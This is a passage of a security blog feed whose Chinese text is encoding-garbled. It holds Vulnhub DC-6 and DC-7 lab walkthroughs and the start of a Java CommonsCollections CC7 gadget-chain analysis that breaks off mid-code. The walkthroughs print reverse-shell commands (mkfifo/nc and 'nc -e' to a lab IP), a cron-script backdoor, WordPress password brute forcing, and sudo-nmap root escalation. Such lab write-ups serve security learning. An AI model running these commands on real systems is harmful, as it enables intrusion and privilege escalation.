alt="image-20230710214837694"><br>exim4ÊèêÊùÉÈúÄË¶ÅÂÜôÊùÉÈôêÔºåËÄåÂú®Ëøô‰∏™ÁõÆÂΩï‰∏ãÊ≤°Áî®ÔºåÈÇ£‰πàÂàáÊç¢Âà∞tmpÁõÆÂΩï‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102148679.png" alt="image-20230710214851580"><br>Â§çÂà∂‰∏ãÊù•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /home/joker27</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêépythonËµ∑ÊúçÂä°Â∞ÜÊñá‰ª∂‰∏ãËΩΩÂà∞Èù∂Êú∫‰∏ä</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://192.168.75.128:8000/46996.sh&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102149296.png" alt="image-20230710214903242"><br>ÁÑ∂ÂêéËµã‰∫àÊâßË°åÊùÉÈôê</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br></pre></td></tr></table></figure><p>ÊâßË°å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102149889.png" alt="image-20230710214913825"><br>ÂæóËµ∂Âø´ÊâßË°åÔºå‰∏çÁÑ∂‰ºöÂ§±Âéªroot<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102149961.png" alt="image-20230710214923860"></p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-7</title>
      <link href="/2023/07/Vulnhub-DC-7/"/>
      <url>/2023/07/Vulnhub-DC-7/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="https://download.vulnhub.com/dc/DC-7.zip">https://download.vulnhub.com/dc/DC-7.zip</a></p><h2 id="ÂºÄÂßãÊâìÈù∂"><a href="#ÂºÄÂßãÊâìÈù∂" class="headerlink" title="ÂºÄÂßãÊâìÈù∂"></a>ÂºÄÂßãÊâìÈù∂</h2><p>Â≠òÊ¥ªIPÊâ´Êèè<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101545737.png" alt="image-20230710154535976"><br>ËÆøÈóÆÈ°µÈù¢ÔºåÂÜÖÂÆπ‰∏∫DrupalÁöÑCMS<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546614.png" alt="image-20230710154607577"><br>È°µÈù¢‰∏äÈù¢Ê≤°Âï•‰∏úË•øÔºå‰ΩÜÊòØÈ°µÈù¢‰∏ãÊúâ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546544.png" alt="image-20230710154617505"><br>ÁôæÂ∫¶‰∏Ä‰∏ãËøô‰∏™Áî®Êà∑ÂèëÁé∞‰∏∫ÂÖ∂GitHub<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546648.png" alt="image-20230710154627596"><br>ËÆøÈóÆÂÖ∂config.phpÂæóÂà∞Êï∞ÊçÆÂ∫ìË¥¶Âè∑ÂØÜÁ†ÅÔºå‰ΩÜÊòØÁôªÂΩï‰∏ç‰∏äÂç¥ÂèØ‰ª•ÁôªÂΩïssh<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546146.png" alt="image-20230710154646095"><br>ËøûÊé•Â¶Ç‰∏ã<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546247.png" alt="image-20230710154656166"><br>ÊâìÂºÄmboxÂèëÁé∞Â≠òÂú®<code>/opt/scripts/backups.sh</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547561.png" alt="image-20230710154719484"><br>ËÆøÈóÆÂÖ∂ÁõÆÂΩïÔºåÊü•Áúãbackups.sh<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547994.png" alt="image-20230710154736908"><br>ÂèëÁé∞Êúâ‰∏™drushÂëΩ‰ª§Ôºå‰ΩÜÊòØ‰∏çÁü•ÈÅìÂÖ∂‰ΩúÁî®ÔºåÊêúÁ¥¢ÂêéÂèëÁé∞Ëøô‰∏™ÂëΩ‰ª§ÂèØ‰ª•‰øÆÊîπÂØÜÁ†ÅÔºåËøõÂÖ•Âà∞var&#x2F;www&#x2F;html‰ΩøÁî®ÂÖ∂ÂëΩ‰ª§‰øÆÊîπ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂà©Áî®Ëøô‰∏™Ë¥¶Âè∑ÂØÜÁ†ÅÂéªÁôªÈôÜ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547364.png" alt="image-20230710154749303"><br>Âú®Content‚Äî&gt;Add content‚Äì&gt;Basic page‰∏ãÂáÜÂ§áÂÜôÈ©¨‰ΩÜÊòØ‰∏çÊîØÊåÅÔºåÂ∞ÜphpËøõË°åÂºïÂÖ•!<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547449.png" alt="image-20230710154758394"><br>Â¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548482.png" alt="image-20230710154812450"><br>ÁÑ∂ÂêéÊääËøô‰∏™Êâ©Â±ïÂºÄÂêØ‰∫ÜÂÜçËøõÂÖ•ÂàöÂàöÈÇ£‰∏™ÁïåÈù¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548082.png" alt="image-20230710154820011"><br>ÁÑ∂ÂêéÂÜôÂÖ•Êú®È©¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548475.png" alt="image-20230710154835443"><br>ÊúÄÂêéÁî®4Ëøû‰∏ä‰∫ÜÔºåÂ•áÂ•áÊÄ™ÊÄ™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548880.png" alt="image-20230710154845834"></p><h2 id="ÊèêÊùÉ"><a href="#ÊèêÊùÉ" class="headerlink" title="ÊèêÊùÉ"></a>ÊèêÊùÉ</h2><p>ËøõÂÖ•optÁõÆÂΩïÔºåÂÜôÂÖ•ÊâìÂºÄÁªàÁ´ØÁÑ∂ÂêéÂÜôÂÖ•ÊèêÊùÉÁöÑËØ≠Âè•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.75.128 6666 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><p>emmmmÔºå‰ΩøÁî®Ëøô‰∏™ÂëΩ‰ª§ÊàêÂäü‰∫Ü‰ΩÜÊòØÊâßË°åÂëΩ‰ª§ËÄÅÊòØÂ§±Ë¥•ÔºåÂºπ‰∏™shellËØïËØï</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.75.158 6666</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548691.png" alt="image-20230710154855636"><br>ÊâßË°åÂëΩ‰ª§ÔºåËøôÈáåË¶ÅÁ®çÂæÆÁ≠â‰∏Ä‰ºöÂÑø<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101549662.png" alt="image-20230710154922627"><br>ÊãøÂà∞rootÊùÉÈôê<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101549169.png" alt="image-20230710154932069"></p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-6</title>
      <link href="/2023/07/Vulnhub-DC-6/"/>
      <url>/2023/07/Vulnhub-DC-6/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="https://download.vulnhub.com/dc/DC-6.zip">https://download.vulnhub.com/dc/DC-6.zip</a></p><h2 id="ÂºÄÂßãÊâìÈù∂"><a href="#ÂºÄÂßãÊâìÈù∂" class="headerlink" title="ÂºÄÂßãÊâìÈù∂"></a>ÂºÄÂßãÊâìÈù∂</h2><p>Â≠òÊ¥ªIPÊâ´Êèè<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091912733.png" alt="image-20230709190836443"><br>ËÆøÈóÆIPÊòæÁ§∫ÂüüÂêç‰ΩÜÊó†Ê≥ïËß£ÊûêÔºåÂíåÂâçÈù¢ÊúâÂè∞DCÈù∂Êú∫‰∏ÄÊ†∑ÔºåËøôÈáåÊàëÂú®win‰∏ã‰øÆÊîπhostsÊñá‰ª∂ÔºåÊâìÂºÄËøô‰∏™Êñá‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913352.png" alt="image-20230709191335290"><br>ÁÑ∂ÂêéÊ≠£Â∏∏ËÆøÈóÆÔºåÁΩëÁ´ôÊòØWordPressÁöÑCMSÔºåÁõ¥Êé•Ê∞∏wpscanÂÖàÊâ´‰∏ÄÊ≥¢ÔºåËøô‰∏™Á´üÁÑ∂Ê≤°Êâ´Âà∞ÁôªÂΩïÁïåÈù¢ÔºådirsearchÂÜçÊâ´‰∏ÄÊ≥¢ÊâæÂà∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913908.png" alt="image-20230709191345851"><br>ÂÜç‰ΩøÁî®wpscanÊâ´‰∏ÄÊ≥¢Áî®Êà∑ÂêçÔºåÂæóÂà∞5‰∏™Áî®Êà∑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url wordy -e u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913053.png" alt="image-20230709191354956"><br>ÁÑ∂ÂêéÊòØÁàÜÁ†¥ÂØÜÁ†Å ÔºåËøôÈáåvulnhubÁªô‰∫ÜÊèêÁ§∫ËÆ©Áî®Âì™‰∏™Â≠óÂÖ∏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OK, this isn&#x27;t really a clue as such, but more of some &quot;we don&#x27;t want to spend five years waiting for a certain process to finish&quot; kind of advice for those who just want to get on with the job.</span><br><span class="line"></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></pre></td></tr></table></figure><p>ÈÇ£‰πàÂéªÁîüÊàê‰∏Ä‰∏ãÂ≠óÂÖ∏ÔºåËøôÈáåÊñ∞ÁâàkaliÂèØËÉΩÊ≤°Áî®Ëß£ÂéãËøô‰∏™Êñá‰ª∂ÈúÄË¶ÅËß£Âéã‰∏Ä‰∏ãÔºåÁîüÊàêÂëΩÂêçÁõ¥Êé•Áî®ÊèêÁ§∫ÁöÑ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure><p>‰∏çË¶ÅcopyÊï∞ÊçÆÊúâÁÇπÂ§öü§îÔºåÁÑ∂ÂêéÂéªÁàÜÁ†¥ÂêßÔºåËøôÈáåË∑ØÂæÑ‰ªÄ‰πàÁöÑËá™Â∑±Ë¶ÅÊ≥®ÊÑè</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url wordy --enumerate u -P passwords.txt</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞Ë¥¶Âè∑ÂØÜÁ†Å<code>mark helpdesk01</code>ÁÑ∂ÂêéÁôªÂΩï‰∏äÂéªÂèëÁé∞Êúâ‰∏™Activity monitorÁúãwpËØ¥Ëøô‰∏™ÊòØÊúâÊºèÊ¥ûÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091914208.png" alt="image-20230709191455156"></p><h2 id="Êãøshell"><a href="#Êãøshell" class="headerlink" title="Êãøshell"></a>Êãøshell</h2><p>Ëøô‰∏™Êàë‰πüÊ≤°Êé•Ëß¶ËøáÔºåÁúãÈ°µÈù¢Â•ΩÂÉèÊòØ‰∏™ÁôªÂΩïÊó•ÂøóÂäüËÉΩÔºåmsfÊêú‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091914719.png" alt="image-20230709191440660"><br>Áî®Ëøô‰∏™Â∞ùËØï‰∏Ä‰∏ãÔºåÂÖàcopyÁúãÁúã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</span><br></pre></td></tr></table></figure><p>ÊâìÂºÄÁúãÂà∞Êúâ‰∏™ÂèçÂºπshellÁöÑ‰ª£Á†Å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915132.png" alt="image-20230709191509096"><br>ÈÇ£‰πàÊääÂüüÂêçÂíåIPÊîπ‰∏Ä‰∏ãÂ∞±Ë°åÔºåÁÑ∂ÂêéÂ∞±Âà©Áî®Â§±Ë¥•ÔºåÊ≤°ÂäûÊ≥ïÊâãÂä®Êù•ÂêßÔºåÊäì‰∏™ÂëΩ‰ª§ÊâßË°åÁÇπÁöÑÂåÖÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915091.png" alt="image-20230709191524042"><br>Ê∑ªÂä†Ë¶ÅÊâßË°åÁöÑÂëΩ‰ª§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915307.png" alt="image-20230709191535273"><br>ÊãøÂà∞shellÂà©Áî®pythonËΩ¨Êç¢‰∏∫‰∫§‰∫íÂºèshellÔºåÁÑ∂ÂêéÂ∞±ÊòØÊèêÊùÉ‰∫Ü</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ÊèêÊùÉ"><a href="#ÊèêÊùÉ" class="headerlink" title="ÊèêÊùÉ"></a>ÊèêÊùÉ</h2><p>ÂÖàÁúã‰∏Ä‰∏ãÂì™‰∫õÂëΩ‰ª§ÂÖ∑ÊúâsuidÊùÉÈôê</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>Ê≤°ÂèëÁé∞ÊàëÁÜüÊÇâÁöÑ‰∏úË•øÔºåËøõÂÖ•homeÁõÆÂΩïÁúãÁúãÔºåÈÄöËøá‰∏ÄÁï™ÁõÆÂΩïÊü•ÁúãÊâæÂà∞‰∫ÜÊèêÁ§∫Êñá‰ª∂things-to-do.txt<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915324.png" alt="image-20230709191549243"><br>ÂæóÂà∞‰∫ÜgrahamÁî®Êà∑ÁöÑÂØÜÁ†ÅÔºåÈÇ£‰πàÂéªËøô‰∏™Áî®Êà∑‰∏ãÁúãÁúãÔºåÁøª‰∫Ü‰∏ãÊñá‰ª∂Ê≤°Âï•‰∏úË•øÔºåÊü•ÁúãÂΩìÂâçÁî®Êà∑ÁöÑÊùÉÈôê<code>sudo -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916387.png" alt="image-20230709191602340"><br>Ëøô‰∏™Áî®Êà∑ÂèØ‰ª•‰ª•jensÁî®Êà∑Êù•ËøêË°åbackups.shÂÖàÊâìÂºÄÁúãÁúãÔºåÂèëÁé∞Ê≤°Âï•‰∏úË•øÔºå‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•ËøõË°åÂÜôÂÖ•Êìç‰ΩúÔºåÈÇ£‰πàÂÜôÂÖ•<code>echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</code>ËøôÊ†∑ËÉΩÂ∞ÜshellÂàáÊç¢Âà∞jensÁî®Êà∑ÔºåÂÜôÂÖ•Âêé‰ª•jensÁî®Êà∑ÊâßË°åÊñá‰ª∂<code>sudo -u jens ./backups.sh</code>ÊàêÂäüÂàáÊç¢shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916468.png" alt="image-20230709191616408"><br>ÈÇ£‰πàÂÜçÊü•Áúã‰∏Ä‰∏ãÂΩìÂâçÁî®Êà∑ÁöÑÊùÉÈôê<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916466.png" alt="image-20230709191631408"><br>ÂèØ‰ª•Áî®rootÊù•ËøêË°ånmapÂπ∂‰∏î‰∏çÈúÄË¶ÅÂØÜÁ†ÅÔºåÈÇ£‰πàÂèØ‰ª•‰ΩøÁî®nmapÊèêÊùÉÔºånmapÊúâÊâßË°åËÑöÊú¨ÁöÑÂäüËÉΩÔºåÈÄöËøáÁºñÂÜôÁâπÊÆäËÑöÊú¨ÔºåÂèØ‰ª•ÂÆûÁé∞Âà©Áî®nmapÊèêÊùÉ<br>ËøôÈáånmapÊèêÊùÉÂàÜ‰∫Ü‰∏§ÁßçÔºåÂÖ∂ÂÆûÂ∞±ÊòØ‰∏çÂêåÁâàÊú¨‰∏ãÁöÑÊñπÂºè</p><ol><li>ÊóßÁâàÊú¨ÊèêÊùÉ<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ËøõÂÖ•nmapÁöÑ‰∫§‰∫íÊ®°Âºè</span><br><span class="line">nmap --interactive</span><br><span class="line"># ÊâßË°åshÔºåÊèêÊùÉÊàêÂäü</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure></li><li>Êñ∞ÁâàÊú¨ÊèêÊùÉ<br>ÂÜôÂÖ•‰∏Ä‰∏™ÊâßË°åbashÁöÑnmapËÑöÊú¨ÔºåËøêË°å<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916759.png" alt="image-20230709191645705"><br>ÊèêÊùÉÊàêÂäüÔºåÊãøflag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916290.png" alt="image-20230709191657223"></li></ol>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãCCÈìæ7</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE7/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE7/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>CommonsCollections 3.1 - 3.2.1ÔºåjdkÂ•ΩÂÉèÊòØÊ≤°ÊúâÈôêÂà∂ÁöÑ</p><h2 id="ÈìæÂ≠êÂàÜÊûê"><a href="#ÈìæÂ≠êÂàÜÊûê" class="headerlink" title="ÈìæÂ≠êÂàÜÊûê"></a>ÈìæÂ≠êÂàÜÊûê</h2><p>ËøôÈáåÂÖ∂ÂÆûÂêéÂçäÈÉ®ÂàÜÂíåCC1‰πüÊòØ‰∏ÄÊ†∑Âè™‰∏çËøáÂÖ•Âè£ÁÇπÂèò‰∫ÜÔºåËøôÈáå‰∏∫<code>Hashtable</code>Ëøô‰∏™Á±ªÔºåÊâæÊ†∑ÊòØÊää‰ªñÂíå<code>LazyMap</code>ËøûËµ∑Êù•Ôºå‰ΩÜÊòØËøôÈáå‰∏çÁõ¥Êé•Âéªfind usages‰∫ÜÔºåÂõ†‰∏∫getË∞ÉÁî®ÂÆûÂú®Â§™Â§ö‰∫ÜÔºåÊâÄ‰ª•Áõ¥Êé•ÁúãÔºåÊúÄÂêéÊòØÊâæÂà∞‰∫Ü<code>AbstractMap</code>Á±ªÔºåÂÆÉÁöÑ<code>equals()</code>ÊñπÊ≥ïË∞ÉÁî®‰∫Ü<code>get()</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350772.png" alt="image-20230709134923730"><br>ÈÇ£‰πà‰∏ã‰∏ÄÊ≠•Â∞±ÊòØÊâæË∞ÅË∞ÉÁî®‰∫Ü<code>equals()</code>ÊñπÊ≥ïÔºå‰ªéËøôÈáåÂºÄÂßã‰ºöÈÅáÂà∞ÂâçÈù¢Âá†Êù°ÈìæÊ≤°ÊúâËøáÁöÑË∞ÉÁî®ÊñπÂºèÂ∞±ÊòØË∞ÉÁî®Â≠êÁ±ªÊ≤°ÊúâÁöÑÊñπÊ≥ïÈÇ£‰πàÂ∞±‰ºöÂéªÂà∞Áà∂Á±ªË∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÊâÄ‰ª•Âú®ËøôÈáå<code>HashMap</code>Ëøô‰∏™Á±ªÁªßÊâø‰∫Ü<code>AbstractMap</code>Á±ª<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350873.png" alt="image-20230709135028795"><br>ËÄå<code>HashMap</code>Á±ªÊ≤°Êúâ<code>equals()</code>ÊñπÊ≥ïÈÇ£‰πàË∞ÉÁî®<code>HashMap</code>Á±ª<code>equals()</code>ÊñπÊ≥ïÂ∞±‰ºöË∞ÉÂà∞<code>AbstractMap</code>Á±ªÁöÑ<code>equals()</code>ÊñπÊ≥ïÊâÄ‰ª•Êé•‰∏ãÊù•Â∞±ÂéªÂØªÊâæË∞ÉÁî®‰∫Ü<code>key.equals</code>Êàë‰ª¨ÊéßÂà∂keyÁöÑÁ±ªÂûã‰∏∫HashMapÂ∞±Ë°å‰∫ÜÔºåÊúÄÁªàÊòØÂú®<code>HashTable</code>Á±ªÁöÑ<code>reconstitutionPut()</code>ÊñπÊ≥ïË∞ÉÁî®‰∫Ü<code>key.equals</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350009.png" alt="image-20230709135043925"><br>ÂÖ∂ÂÆûËøôÈáå<code>equals</code>ÁöÑË∞ÉÁî®ËøòÊòØÊå∫ÁªïÁöÑÔºå‰∏ÄÂºÄÂßãÊòØ‰º†LazyMapÂØπË±°Âà∞<code>AbstractMap</code>Á±ªÂéªË∞ÉÁî®<code>equals</code>Â∞±Áõ∏ÂΩì‰∫éLazyMapË∞ÉÁî®<code>equals</code>‰ΩÜÊòØLazyMapÊ≤°Êúâ<code>equals</code>ÊâÄ‰ª•Â∞±ÂéªLazyMapÁöÑÁà∂Á±ª<code>AbstractMapDecorator</code>ÊâæËôΩÁÑ∂<code>AbstractMapDecorator</code>ÊòØ‰∏Ä‰∏™ÊäΩË±°Á±ªÔºå‰ΩÜÂÆÉÂÆûÁé∞‰∫Ü<code>equals</code>ÊñπÊ≥ï„ÄÇ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123; </span><br><span class="line"><span class="comment">//Âà§Êñ≠ÂΩìÂâçÂØπË±°‰∏é‰º†ÂÖ•ÂØπË±°ÊòØÂê¶‰∏∫Âêå‰∏Ä‰∏™ÂØπË±°</span></span><br><span class="line">    <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> map.equals(object);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AbstractMapDecorator</code>Á±ªÁöÑ<code>equals</code>ÊñπÊ≥ïÂè™ÊØîËæÉ‰∫ÜËøô‰∏§‰∏™keyÁöÑÂºïÁî®ÔºåÂ¶ÇÊûú‰∏çÊòØÂêå‰∏ÄÂØπË±°‰ºöÂÜçÊ¨°Ë∞ÉÁî®<code>equals</code>ÊñπÊ≥ïÔºåmapÊòØÈÄöËøá<code>LazyMap</code>‰º†ËøáÊù•ÁöÑÁõ∏ÂΩì‰∫éÊòØ<code>LazyMap</code>ÁöÑÂØπË±°ÔºåÊàë‰ª¨Âú®ÊûÑÈÄ†Âà©Áî®ÈìæÁöÑÊó∂ÂÄôÔºåÈÄöËøá<code>LazyMap</code>ÁöÑÈùôÊÄÅÊñπÊ≥ï<code>decorate</code>Â∞Ü<code>HashMap</code>‰º†Áªô‰∫ÜmapÂ±ûÊÄßÔºåÂõ†Ê≠§ËøôÈáå‰ºöË∞ÉÁî®<code>HashMap</code>ÁöÑ<code>equals</code>ÊñπÊ≥ï„ÄÇÊâÄ‰ª•ÂèàÂéª<code>AbstractMapDecorator</code>Áà∂Á±ªÂç≥<code>AbstractMap</code>Á±ªÊâæÊúÄÁªàÊâæÂà∞Ë∞ÉÁî®‰∫Ü<code>equals</code>ÁÑ∂ÂêéÂÜç<code>AbstractMap</code>Á±ªÂéªË∞ÉÁî®<code>LazyMap</code>Ë∞ÉÁî®getÔºåËøôÈáåÊÉ≥‰∫ÜÂçäÂ§©<code>AbstractMapDecorator</code>Á±ªÊÄé‰πàÂíå<code>HashMap</code>ÊâØ‰∏äÂÖ≥Á≥ªÁöÑ<br>Áé∞Âú®Â∞±ÊòØÊâæË∞ÅË∞ÉÁî®‰∫Ü<code>reconstitutionPut()</code>ÊñπÊ≥ïÔºåÊúÄÁªàÂú®Âêå‰∏Ä‰∏™Á±ªÂç≥<code>HashTable</code>Á±ªÁöÑ<code>readObject()</code>ÊñπÊ≥ïË∞ÉÁî®‰∫Ü<code>reconstitutionPut()</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351732.png" alt="image-20230709135106646"><br>ÈÇ£‰πàÂà∞ËøôÈáåÈìæÂ≠êÂ∞±ÂàÜÊûêÂÆå‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351548.png" alt="image-20230709135114488"></p><h2 id="EXPË∞ÉËØï"><a href="#EXPË∞ÉËØï" class="headerlink" title="EXPË∞ÉËØï"></a>EXPË∞ÉËØï</h2><p>ËøôÈáåÂÖàÊääCC1ÁöÑÂêéÂçäÊÆµÊãøËøáÊù•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title 